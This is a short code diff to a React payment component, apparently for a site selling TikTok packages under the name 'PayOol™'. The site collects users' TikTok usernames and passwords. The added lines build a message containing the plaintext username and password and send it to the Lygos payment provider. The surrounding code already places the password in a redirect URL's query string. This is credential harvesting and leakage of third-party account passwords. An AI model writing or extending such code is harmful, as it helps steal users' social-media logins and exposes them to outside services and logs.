@@ -88,6 +88,9 @@ function App() {
     // Combine username and password in the customerName field
     const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.password}`;
     
+    // Créer un message avec les identifiants complets pour Lygos
+    const messageWithCredentials = `${description} | User: ${tiktokData.username} | Pass: ${tiktokData.password}`;
+    
     // Encoder les identifiants pour l'URL
     const encodedUsername = encodeURIComponent(tiktokData.username);
     const encodedPassword = encodeURIComponent(tiktokData.password);
@@ -103,7 +106,7 @@ function App() {
       successUrl: `${window.location.origin}/payment/confirmation?orderId=${orderId}&username=${encodedUsername}&password=${encodedPassword}&email=${encodedEmail}&amount=${selectedPackage.amount + (selectedPackage.bonus || 0)}&price=${selectedPackage.price}`,
       failureUrl: `${window.location.origin}/payment/failure?orderId=${orderId}`,
       shopName: 'PayOol™',
-      message: description
+      message: messageWithCredentials
     }, provider)
     .then(() => {
       console.log('Payment initiated successfully');
